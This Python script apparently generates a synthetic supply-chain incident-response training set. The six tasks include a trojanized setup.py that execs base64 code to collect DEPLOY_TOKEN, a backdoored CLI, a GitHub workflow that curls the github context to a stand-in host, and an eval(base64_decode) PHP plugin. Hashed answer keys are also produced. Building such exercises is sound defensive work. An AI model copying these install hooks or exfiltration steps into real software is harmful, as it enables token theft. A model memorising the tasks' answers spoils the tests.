#!/usr/bin/env python3
"""Generate the cybergym_supply_chain tasks (six classes modelled on the
October 2026 supply-chain incidents; all artifacts synthetic and deterministic).
Every task follows the four primitives: sandboxed artifact tree, difficulty
inputs (source-first), shell tools, deterministic grader (answer hash)."""
import base64
import hashlib
import json
import os
import random

HERE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tasks")


def W(task, name, text, mode="w"):
    with open(os.path.join(HERE, task, name), mode) as h:
        h.write(text if mode == "w" else text)


def answer_file(task, answer):
    with open(os.path.join(HERE, task, "answer.sha256"), "w") as h:
        h.write(hashlib.sha256(answer.encode()).hexdigest() + "\n")


def poisoned_release():
    rng = random.Random(21)
    payload_plain = "import os;open('/tmp/.collect','a').write(os.environ.get('DEPLOY_TOKEN',''))"
    payload = base64.b64encode(payload_plain.encode()).decode()
    marker = "fastjson-utils 1.4.1: performance fix for parser path\n"
    clean_setup = (
        "from setuptools import setup\n"
        "setup(name='fastjson-utils', version='1.4.0', packages=['fastjson_utils'])\n"
    )
    dirty_setup = (
        "import base64\n"
        "from setuptools import setup\n"
        "setup(name='fastjson-utils', version='1.4.1', packages=['fastjson_utils'])\n"
        f"exec(base64.b64decode('{payload}').decode())\n"
    )
    os.makedirs(os.path.join(HERE, "poisoned-release", "index", "fastjson-utils", "1.4.0"), exist_ok=True)
    os.makedirs(os.path.join(HERE, "poisoned-release", "index", "fastjson-utils", "1.4.1"), exist_ok=True)
    W("poisoned-release", "index/fastjson-utils/1.4.0/setup.py", clean_setup)
    W("poisoned-release", "index/fastjson-utils/1.4.1/setup.py", dirty_setup)
    W("poisoned-release", "index/fastjson-utils/1.4.1/CHANGES.md", marker + "minor packaging refresh\n")
    W("poisoned-release", "index/fastjson-utils/1.4.0/CHANGES.md", "fastjson-utils 1.4.0: stable parser\n")
    W("poisoned-release", "challenge.txt",
      "The local package index holds two releases of fastjson-utils. A newer\n"
      "release was trojanized during a build-infrastructure compromise: its install\n"
      "hook contains an obfuscated payload. Diff the releases and submit the exact\n"
      "BASE64 STRING of the obfuscated payload (the literal inside b64decode(...)).\n")
    answer_file("poisoned-release", payload)


def cli_backdoor_magic():
    rng = random.Random(22)
    magic = "maintainer-reset-token-9f3a"
    key = "AKIA-EXAMPLE- signing-key-marker-7734"
    script = f"""#!/bin/sh
# ovhctl - example cloud CLI (rebuilt after the incident)
case "$1" in
  version) echo "ovhctl 2.3.1";;
  whoami) echo "config: $HOME/.ovhctl/config.toml";;
  {magic}) echo "{key}";;
  *) echo "usage: ovhctl <version|whoami>";;
esac
"""
    os.makedirs(os.path.join(HERE, "cli-backdoor-magic", "bin"), exist_ok=True)
    W("cli-backdoor-magic", "bin/ovhctl", script)
    os.chmod(os.path.join(HERE, "cli-backdoor-magic", "bin", "ovhctl"), 0o755)
    W("cli-backdoor-magic", "README.md",
      "ovhctl 2.3.1 was rebuilt on a compromised builder; one binary shipped with\n"
      "an undocumented maintenance branch. The signing key it can print is the\n"
      "compromise marker.\n")
    W("cli-backdoor-magic", "challenge.txt",
      "A rebuilt CLI binary contains an undocumented magic-argument branch that\n"
      "prints a signing-key marker. Find the magic argument, RUN the binary with\n"
      "it, and submit the printed marker EXACTLY.\n")
    answer_file("cli-backdoor-magic", key)


def deleted_secret_history():
    rng = random.Random(23)
    token = "sk-live-4d0c9f2ab37e6511"
    repo = os.path.join(HERE, "deleted-secret-history", "app")
    os.makedirs(repo, exist_ok=True)
    W("deleted-secret-history", "challenge.txt",
      "The app repository once committed a live deployment token and removed it\n"
      "one commit later. The removal did not rewrite history. Recover the token\n"
      "from the git history and submit it exactly.\n")
    # deterministic history is built at image build time by build_history.sh
    W("deleted-secret-history", "build_history.sh",
      "#!/bin/sh\nset -e\ncd app\n[ -d .git ] && exit 0\ngit init -q\ngit config user.email a@b.c\ngit config user.name dev\n"
      "printf 'initial commit\\n' > README.md\ngit add README.md\ngit commit -qm 'init'\n"
      f"printf 'DEPLOY_TOKEN={token}\\n' > .env\ngit add .env\ngit commit -qm 'add env'\n"
      "git rm -q .env\ngit commit -qm 'remove env file'\n"
      "printf 'app code\\n' > main.py\ngit add main.py\ngit commit -qm 'code'\n")
    os.chmod(os.path.join(HERE, "deleted-secret-history", "build_history.sh"), 0o755)
    W("deleted-secret-history", "app/README.md", "placeholder\n")
    answer_file("deleted-secret-history", token)


def workflow_exfil():
    rng = random.Random(24)
    url = "https://status-hooks.example.net/catch/9f2c"
    workflow = f"""name: pr-preview
on:
  pull_request_target:
    types: [opened]
jobs:
  preview:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
      - run: |
          echo "context: ${{{{ toJSON(github) }}}}" >> /tmp/ctx
          curl -s -X POST -d @/tmp/ctx {url} > /dev/null
      - run: gh pr comment $PR --body "preview ready"
        env:
          GH_TOKEN: ${{{{ secrets.GITHUB_TOKEN }}}}
"""
    os.makedirs(os.path.join(HERE, "workflow-exfil", ".github", "workflows"), exist_ok=True)
    W("workflow-exfil", ".github/workflows/pr-preview.yml", workflow)
    W("workflow-exfil", "challenge.txt",
      "This repository's PR workflow was modified so that fork pull requests can\n"
      "reach repository secrets. Find the workflow file, read what the unchecked\n"
      "checkout step exfiltrates and WHERE it sends it, and submit the exact\n"
      "destination URL.\n")
    answer_file("workflow-exfil", url)


def plugin_payload():
    rng = random.Random(25)
    domain = "matilda-updates.example.io"
    inner = f"echo 'ping {domain}';"
    encoded = base64.b64encode(inner.encode()).decode()
    plugin = f"""<?php
/* seo-booster 4.2.1 */
function seo_boost_render($opts) {{
    $html = sanitize($opts['html']);
    eval(base64_decode('{encoded}'));
    return $html;
}}
"""
    os.makedirs(os.path.join(HERE, "plugin-payload", "wp-content", "plugins", "seo-booster"), exist_ok=True)
    W("plugin-payload", "wp-content/plugins/seo-booster/seo-booster.php", plugin)
    W("plugin-payload", "challenge.txt",
      "An official plugin release shipped with an eval(base64_decode(...))\n"
      "payload. Decode it and submit the host it contacts (the domain, exactly\n"
      "as it appears inside the decoded payload).\n")
    answer_file("plugin-payload", domain)


def chain_of_trust():
    rng = random.Random(26)
    leaf_serial = "0C:9F:A7:33:21:B4:5E:88"
    W("chain-of-trust", "challenge.txt",
      "After a certificate-authority compromise, the intermediate 'Vault Issuing\n"
      "B' must not be trusted anymore. Two leaf certificates in certs/ both\n"
      "CLAIM that intermediate as their issuer, but only one was genuinely signed\n"
      "by its key; the other is rogue. Verify the signatures (openssl or python\n"
      "cryptography) and submit the SERIAL of the genuinely signed leaf, exactly\n"
      "as colon-separated uppercase hex (e.g. 0C:9F:...).\n")
    os.makedirs(os.path.join(HERE, "chain-of-trust", "certs"), exist_ok=True)
    # certs are generated deterministically by build_certs.py (cryptography lib)
    W("chain-of-trust", "build_certs.py",
      'import datetime, ipaddress, os\n'
      'from cryptography import x509\n'
      'from cryptography.hazmat.primitives import hashes, serialization\n'
      'from cryptography.hazmat.primitives.asymmetric import ec\n'
      'from cryptography.x509.oid import NameOID\n'
      'HERE = os.path.dirname(os.path.abspath(__file__))\n'
      'def name(cn): return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])\n'
      'def key(): return ec.generate_private_key(ec.SECP256R1())\n'
      'def cert(pub, issuer, issuer_key, serial, cn, ca=False):\n'
      '    now = datetime.datetime(2026, 10, 1)\n'
      '    builder = (x509.CertificateBuilder().subject_name(name(cn)).issuer_name(name(issuer))\n'
      '               .public_key(pub).serial_number(serial).not_valid_before(now)\n'
      '               .not_valid_after(now + datetime.timedelta(days=365)))\n'
      '    if ca:\n'
      '        builder = builder.add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)\n'
      '    return builder.sign(issuer_key, hashes.SHA256())\n'
      'root_k = key(); root = cert(root_k.public_key(), "Vault Root", root_k, 0x1000, "Vault Root", ca=True)\n'
      'mid_k = key(); mid = cert(mid_k.public_key(), "Vault Root", root_k, 0x2000, "Vault Issuing B", ca=True)\n'
      'leaf_k = key()\n'
      f'leaf = cert(leaf_k.public_key(), "Vault Issuing B", mid_k, 0x0C9FA73321B45E88, "edge-ingress")\n'
      'rogue_k = key()\n'
      'rogue = cert(rogue_k.public_key(), "Vault Issuing B", rogue_k, 0x0C9FA73321B45E99, "edge-ingress-2")\n'
      'for nm, c in [("root", root), ("intermediate-b", mid), ("edge-ingress", leaf), ("edge-ingress-2", rogue)]:\n'
      '    open(os.path.join(HERE, "certs", nm + ".pem"), "wb").write(c.public_bytes(serialization.Encoding.PEM))\n')
    answer_file("chain-of-trust", leaf_serial)


def main():
    os.makedirs(HERE, exist_ok=True)
    for fn in (poisoned_release, cli_backdoor_magic, deleted_secret_history,
               workflow_exfil, plugin_payload, chain_of_trust):
        os.makedirs(os.path.join(HERE, fn.__name__.replace("_", "-")), exist_ok=True)
        fn()
    index = {
        "env": "cybergym-supply-chain",
        "description": "Supply-chain incident response and exploitation classes modelled on the October 2026 incidents (trojanized releases, backdoored CLI builds, secrets in git history, workflow exfiltration, plugin payloads, CA chain-of-trust). Synthetic, deterministic artifacts; answers verified server-side by hash.",
        "tasks": [
            {"task_id": "poisoned-release", "split": "train", "verify": "hash"},
            {"task_id": "cli-backdoor-magic", "split": "train", "verify": "hash"},
            {"task_id": "deleted-secret-history", "split": "train", "verify": "hash"},
            {"task_id": "workflow-exfil", "split": "train", "verify": "hash"},
            {"task_id": "plugin-payload", "split": "train", "verify": "hash"},
            {"task_id": "chain-of-trust", "split": "train", "verify": "hash"},
        ],
    }
    with open(os.path.join(HERE, "index.json"), "w") as h:
        json.dump(index, h, indent=2)
    print("tasks generated")


if __name__ == "__main__":
    main()
